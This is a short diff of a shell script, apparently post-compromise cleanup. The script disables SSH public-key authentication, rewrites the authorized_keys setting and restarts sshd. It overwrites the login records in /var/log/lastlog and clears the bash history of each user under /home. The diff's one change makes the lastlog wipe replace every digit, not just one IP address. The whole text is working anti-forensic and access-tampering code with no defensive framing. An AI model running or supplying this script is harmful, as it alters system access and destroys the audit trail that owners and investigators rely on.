@@ -43,7 +43,7 @@ sed -i 's/PubkeyAuthentication yes/PubkeyAuthentication no/g' /etc/ssh/sshd_conf
 sed -i 's/RSAAuthentication yes/RSAAuthentication no/g' /etc/ssh/sshd_config
 sed -i 's/authorized_keys/authorized_key/g' /etc/ssh/sshd_config
 service sshd restart
-sed -i 's/$ip/0.0.0.0/g' /var/log/lastlog
+sed -i 's/[0-9]/0/g' /var/log/lastlog
 users=`ll /home/ | grep -vE "root|total" | awk '{print $9}' | sed 's/\///g'`
 for i in ${users}; do
         cat /dev/null > /home/$i/.bash_history
